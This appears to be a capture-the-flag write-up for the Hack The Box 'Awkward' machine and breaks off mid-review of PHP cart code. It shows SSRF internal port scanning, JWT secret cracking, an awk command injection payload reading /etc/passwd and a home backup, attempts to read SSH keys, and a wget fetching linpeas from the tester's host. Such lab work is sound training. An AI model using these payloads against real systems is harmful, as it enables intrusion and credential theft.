# Hackthebox - Awkward - Linux

![Awkward](../.res/htb-awkward.png)  

## Nmap

```bash
┌──(kali㉿kali)-[~/Documents/hackthebox/awkward]
└─$ sudo nmap -T4 -sC -sV -O -Pn -p- 10.10.11.185                                                                                                        
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-29 14:33 EST
Nmap scan report for 10.10.11.185
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7254afbaf6e2835941b7cd611c2f418b (ECDSA)
|_  256 59365bba3c7821e326b37d23605aec38 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.97 seconds
```

- When accessing to http://10.10.11.185 it fails to redirect us to `http://hat-valley.htb`. So we need to modify our /etc/hosts file `10.10.11.185 	hat-valley.htb`

## Port 80

- When accessing http://hat-valley.htb/ we land here

![hat valley](../.res/2022-12-29-14-47-55.png)

### Gobuster

```bash
┌──(kali㉿kali)-[~/Documents/hackthebox/awkward]
└─$ gobuster dir -u http://hat-valley.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hat-valley.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/29 14:58:11 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 173] [--> /css/]
/favicon.ico          (Status: 200) [Size: 4286]
/js                   (Status: 301) [Size: 171] [--> /js/]
/static               (Status: 301) [Size: 179] [--> /static/]
Progress: 20379 / 20476 (99.53%)===============================================================
2022/12/29 14:59:40 Finished
===============================================================

```

### WFUZZ dns

- We have to filter on 200 `wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://hat-valley.htb/' -H "HOST: FUZZ.hat-valley.htb" --hc 200`

```bash
┌──(kali㉿kali)-[~/Documents/hackthebox/awkward]
└─$ wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://hat-valley.htb/' -H "HOST: FUZZ.hat-valley.htb" --hc 200
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://hat-valley.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================

000000037:   401        7 L      12 W       188 Ch      "store - store" 
Total time: 453.1638
Processed Requests: 100000
Filtered Requests: 99999
Requests/sec.: 220.6707
```

- `http://store.hat-valley.htb` if we go to this url we get a login prompt
- When playing with the request on burp I found a page in /static/js dashboard.js, it might be wise to have a look and see if we can enumerate anything else in the static and js folders.
- What caught my attention in burp is the cookie with `Cookie: token=guest`
- Of course I tried to update it to admin but did not get anything. Tried also in the browser it did update the cookie to admin so maybe I should check out for other pages.
- so let's launch gobuster again and see if it finds anything

### more dir enum

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://hat-valley.htb/js -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hat-valley.htb/js
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/30 14:02:35 Starting gobuster in directory enumeration mode
===============================================================
/app                  (Status: 200) [Size: 150]
/custom               (Status: 200) [Size: 153]
/plugin               (Status: 200) [Size: 153]
Progress: 20411 / 20476 (99.68%)===============================================================
2022/12/30 14:04:30 Finished
===============================================================
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://hat-valley.htb/static -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hat-valley.htb/static
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/30 14:05:21 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 187] [--> /static/css/]
/fonts                (Status: 301) [Size: 191] [--> /static/fonts/]
/images               (Status: 301) [Size: 193] [--> /static/images/]
/js                   (Status: 301) [Size: 185] [--> /static/js/]
/vendors              (Status: 301) [Size: 195] [--> /static/vendors/]
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://hat-valley.htb/static/js -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hat-valley.htb/static/js
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/30 14:07:31 Starting gobuster in directory enumeration mode
===============================================================
/chart                (Status: 200) [Size: 159]
/dashboard            (Status: 200) [Size: 163]
/template             (Status: 200) [Size: 162]
Progress: 20459 / 20476 (99.92%)===============================================================
2022/12/30 14:08:56 Finished
===============================================================
```

If we add js at the end of each page in static/js and in js we get the code. In the app.js code this comes back quite often `./src/HR`. We also seem to have some references to an API `/api/\`.
- Let's try to access it with our browser http://hat-valley.htb/hr. We get a login page.  
![login page](../.res/2022-12-30-15-30-34.png)
- This snippet is interesting `/api/\";\n\nvar staff_details = function staff_details() {\n  return axios__WEBPACK_IMPORTED_MODULE_0___default.a.get(baseURL + 'staff-details')` we can conclude we have and `/api/staff-details` endpoint.
- Doing a research for "baseURL" we get 9 results and we can find more:
  - `/api/all-leave`
  - `/api/submit-leave`
  - `/api/login`
  - `/api/store-status`
- Let's see if we can access these. The staff-details endpoint leaks password
![staff details](../.res/2022-12-30-14-50-15.png)
- Our cookie is still set on `token=admin` because I changed it before. It does not seem to matter though because it is not in the request. See the request here  
![request](../.res/2022-12-30-14-51-11.png)
- Let's get confirmation of this on the repeater. Indeed if we try to add a cookie to the request we get a jwt token error.  
![jwt error](../.res/2022-12-30-14-55-34.png)  
- So the jwt token is not implemented yet. And it might be why we can access the staff-details page. Let's check out the other API endpoints.
- The `all-leave` returns and "Invalid User" error
![invalid user](../.res/2022-12-30-14-59-47.png)
- The submit leave does not seem to accept our http verb so maybe we can try a post request  
![cannot get](../.res/2022-12-30-15-00-43.png)
- If we make a post request we get "Invalid User"
![Invalid user](../.res/2022-12-30-15-03-11.png)
- Also I wanted to check if there was a documentation for the api and got this  
![docs](../.res/2022-12-30-15-01-39.png)  
- And if I try a POST on this I get "Cannot POST" so this looks like a 404. Furthermore, if we make up an endpoint that we are sure could not exist it behaves like this as well. So def a 404.  
![Non existent page](../.res/2022-12-30-15-05-53.png)  
- Ok I had fun looking at the web App but it is definitely time to try and crack the hashes we found.
- Let's first start with Crackstation: 
  - It does not find christine wool's password.
  - If does find Christopher Jones' one: `chris123`
![cracked pass](../.res/2022-12-30-15-09-18.png)
  - It does not find the 2 others as well and I am pretty sure hashcat will not find them either because crackstation uses plenty of wordlists so the rokyou is certainly one of these. What we could try though if we need later is using cewl to generate a wordlist from the website and try it. But as we have a password, this is not necessary for now.
- The password does not work on ssh. Let's try it on the login page we found when enumerating subdomain.
- Let's try to login with the endpoint login.
- So if just make a get request we have the cannot get error but if we change to post we have this:  
![error](../.res/2022-12-30-15-21-07.png)  
- So this is promising. It's a type error so let's convert our request in json and send it. Interesting now it is asking for a string:  
![ask for string](../.res/2022-12-30-15-22-36.png)  
- Now let's try with a username and password and see if we get a token  

```html
POST /api/login HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 7
Content-Type: application/json;charset=UTF-8

{"username":"christopher.jones",
"password":"chris123"}
```

- This should do the trick. It works! We get a token!
![token](../.res/2022-12-30-15-25-17.png)
- So now we should be able to access the endpoints we could not previously access. It works but it will involeve some reverse engineering to find out how to properly forge the requests.
![works](../.res/2022-12-30-15-37-12.png)
- Let's be lazy and try to login on the hr page we found before with the creds. It works!  
![logged in](../.res/2022-12-30-15-33-09.png)  
- Looking around we can make leave request. But the thing that is really interesting is the refresh button here  
![refresh](../.res/2022-12-30-15-47-30.png)  
- This makes a request like this  

```html
GET /api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22 HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://hat-valley.htb/dashboard
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjcyNDMyMzUxfQ.7YS1QAXwzDtj__tSeUUAg2pINnvxxA1hBmOof4-HEkQ
```

- This url parameter is really interesting. If we add it to our repeater and set up a python web server we can see if it actually makes a request to our server. So let's try this  

```html
GET /api/store-status?url=%22http%3a%2f%2f10.10.14.10%2ftest%22 HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://hat-valley.htb/dashboard
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjcyNDMyMzUxfQ.7YS1QAXwzDtj__tSeUUAg2pINnvxxA1hBmOof4-HEkQ
```

- And it works our server receives the request  

![Request received](../.res/2022-12-30-15-57-33.png)  

- The first step in ssrf is usually to check if we have open ports on the target.
We can see that we do not get the same response when a port is open than when it is closed:
  - Port open.

![Port open](../.res/2023-01-02-15-22-19.png)

  - Port closed

![closed port](../.res/2023-01-02-15-21-23.png)

- Let's see what other ports we have using burp intruder  

![intruder](../.res/2023-01-02-15-23-35.png)  

- Now we can use the "Numbers" payload type and increment them to one from 1 to 65535

![payload settings](../.res/2023-01-02-15-26-28.png)

- Let's make a grep in the options tab on `<!DOCTYPE html>` 

![grep match](../.res/2023-01-02-15-28-24.png)

- Once we get some hits, we can check out the result in our browser by copying the url from burp
- So for port 3002 http://hat-valley.htb/api/store-status?url=%22http%3a%2f%2f127.0.0.1%3a3002%22 we have the API documentation
![API doc](../.res/2023-01-02-15-38-03.png)  

- Here are the open ports we found with intruder (80, 3002, 8080)

![open ports](../.res/2023-01-02-15-59-48.png)

- The api documentation is really interesting. What will need further investigation is the all-leave endpoint. See the code here

```javascript
app.get('/api/all-leave', (req, res) => {

  const user_token = req.cookies.token
  var authFailed = false
  var user = null
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
    }
  }
  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }
  if(!user) {
    return res.status(500).send("Invalid user")
  }
  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]
  const badInUser = bad.some(char => user.includes(char));
  if(badInUser) {
    return res.status(500).send("Bad character detected.")
  }
  exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
    if(stdout) {
      return res.status(200).send(new Buffer(stdout, 'binary'));
    }
    if (error) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
    if (stderr) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
  })
})
```

- So it takes the user (which we have control over) to pass it to an awk command.
- To manipulate the user variable we will need to tamper with the jwt token in the snippet where our user is. But first let's have a look at it. We can use jwt.io but why not try out a burp extension from the bapp store. if we look up jwt token there is one called [Json Web token](https://github.com/portswigger/json-web-tokens) that would be worth trying.
- Here is what our decoded token with our new burp extension looks like  

![decoded token](../.res/2023-01-02-16-43-21.png)  

- The only thing is that we need to get the secret key if we want to modify it.
- [Here](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#jwt-1) are the command to do this with john.
- We can get jwt2john [here](https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py) and try to crack the jwt but in out case we will use the rockyou wordlist instead of the default john.

```bash
python3 jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjcyNjg5NzM1fQ.cFPbFAHQ5XO-YEwU1MNVx2nPX2QO0CG1dNznvbD6P_0 > jwtjohn
john jwtjohn --wordlist=/usr/share/wordlists/rockyou.txt
```

- It works we get the key `123beany123`

![john](../.res/2023-01-04-10-12-35.png)

- So using this we can generate malicious jwt token. Let's use [jwt.io](https://jwt.io/) for this
- So I had to play a little with the spaces for the command to be working
- Let's inspect this. Our command is like this
`"awk '/" + user + "/' /var/www/private/leave_requests.csv"` so with the real user it looks like this `"awk '/" + "christopher.jones" + "/' /var/www/private/leave_requests.csv"`. So we want to do something like this `"awk '/" + "/' /etc/passwd '" + "/' /var/www/private/leave_requests.csv"`
- So our payload will be `"/' /etc/passwd '"`
![payload](../.res/2023-01-04-10-41-19.png)
- We can now add our new generated token in the request of the endpoint `/api/all-leave`  
![new token](../.res/2023-01-04-10-42-16.png)
- And it works we get the `/etc/passwd` file
- here it is

```bash

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin
systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
whoopsie:x:117:124::/nonexistent:/bin/false
sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
saned:x:121:128::/var/lib/saned:/usr/sbin/nologin
colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false
gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
postfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin
mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:130:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:999::/var/log/laurel:/bin/false
```

- Here are our users in the system

![users](../.res/2023-01-04-10-45-40.png)

- Maybe we could find an ssh key `"/' /home/bean/.ssh/id_rsa '"` did not work with either use.
- Let try to get .bashrc or .bash_history. bash_history does not give anything but bashrc shows up

```bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

- There is an alias that uses a homemade script `/home/bean/Documents/backup_home.sh`.
- Let's check it out

```bash
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

- We need to get the file with curl we wont be able with burp.
- The --cookie does not work let's try the --header
- And it works `curl --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY3MjY4OTczNX0.LkFALppbSDqosL-J0WTN_U_aULTDgYnlN1uBIysxjE8" http://hat-valley.htb/api/all-leave --output bean.tar.gz`
> Here you should create a directory because the files you will get is the full home dir backup so it can look messy if you are a member of the cleaning patrol like me ^_^''

- We unzip our file and get the other archive so we need to extract it as well.
- The best way to have an idea of the files is the tree command that I really like

![tree part 1](../.res/2023-01-04-12-50-01.png)  
![tree part 2](../.res/2023-01-04-12-51-03.png)  
![tree part 3](../.res/2023-01-04-12-51-46.png)  

- Now we can explore this. We find the file `.config/xpad/content-DS1ZS1` that contains a password. And something that looks like a hint and that we should keep apart.

```bash
┌──(kali㉿kali)-[~/Documents/hackthebox/awkward/found-archive]
└─$ cat .config/xpad/content-DS1ZS1 
TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism for HR system
- Setup better confirmation message when adding item to cart
- Add support for item quantity > 1
- Implement checkout system

boldHR SYSTEM/bold
bean.hill
014mrbeanrules!#P

https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html

boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold  
```

- We can now ssh as bean using the password `014mrbeanrules!#P`

![ssh as been](../.res/2023-01-04-14-15-56.png)  

- We can grab the user flag

## Privesc

- Sudo -l does not give anything
- Let's see uname -a and take linpeas `Linux awkward 5.15.0-52-generic #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux`
- `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64`
- `python3 -m http.server 80`
And in our target `wget http://10.10.14.10/linpeas_linux_amd64`
- `chmod +x linpeas_linux_amd64`
- `./linpeas_linux_amd64`
- Things worth investigating

```bash
    18090     68 -rw-------   1 christine mail        61916 Jan  5 06:20 /var/mail/christine                         
    18089    100 -rw-------   1 root      mail        98220 Jan  5 06:26 /var/mail/root
    18090     68 -rw-------   1 christine mail        61916 Jan  5 06:20 /var/spool/mail/christine
    18089    100 -rw-------   1 root      mail        98220 Jan  5 06:26 /var/spool/mail/root
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/home/bean/.cache/tracker3/files/meta.db-shm
/home/bean/.cache/tracker3/files/meta.db-wal
/home/bean/.cache/tracker3/files/http%3A%2F%2Ftracker.api.gnome.org%2Fontology%2Fv3%2Ftracker%23FileSystem.db-wal
/home/bean/.cache/tracker3/files/last-crawl.txt
/home/bean/.cache/tracker3/files/http%3A%2F%2Ftracker.api.gnome.org%2Fontology%2Fv3%2Ftracker%23FileSystem.db-shm
╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid 
-rwxr-sr-x 1 root tty 23K Feb 21  2022 /usr/bin/write.ul (Unknown SGID binary)
╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root root 44 Sep 15 22:34 /etc/nginx/conf.d/.htpasswd                                                   
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                               
ptrace protection is enabled (1)                                                                                     
gdb was found in PATH
```

- Let's see if we can crack the password we found. We will need to check in the [hashcat documentation](https://hashcat.net/wiki/doku.php?id=example_hashes) to chose the proper mode. We make a ctrl+f on the page and look for "$apr" so let's try -m 1600 `hashcat -m 1600 htpasswd /usr/share/wordlists/rockyou.txt`
- Seems like a rabbit hole because there's no hit
- If we look around we have a private dir in /var/www but we have permission denied on it.
- I just remembered that we found a subdomain during the enumeration phase. It was a login portal. Let's try to reuse the password we previously found `014mrbeanrules!#P`. So we had to use it with the username `admin` and not `bean.hill`
- It is also time to check out the thing that seemed to be a hint in the file we found bean.hill credentials: https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html 
- Let's check the app files in the server  

![files](../.res/2023-01-04-15-15-34.png)

- When I was looking around the website in my browser I added some items in my cart. Turns out I can see them in the folder carte we can see the items.  
![cart](../.res/2023-01-04-15-17-26.png)  

- Let's check the code for this. Cause this shows that we can write files on the server using the website. Let's first check cart_actions.php

```php
<?php

$STORE_HOME = "/var/www/store/";

//check for valid hat valley store item
function checkValidItem($filename) {
    if(file_exists($filename)) {
        $first_line = file($filename)[0];
        if(strpos($first_line, "***Hat Valley") !== FALSE) {
            return true;
        }
    }
    return false;
}

//add to cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'add_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    if(checkValidItem("{$STORE_HOME}product-details/{$item_id}.txt")) {
        if(!file_exists("{$STORE_HOME}cart/{$user_id}")) {
            system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
        }
        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
        echo "Item added successfully!";
    }
    else {
        echo "Invalid item";
    }
    exit;
}

//delete from cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }
    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
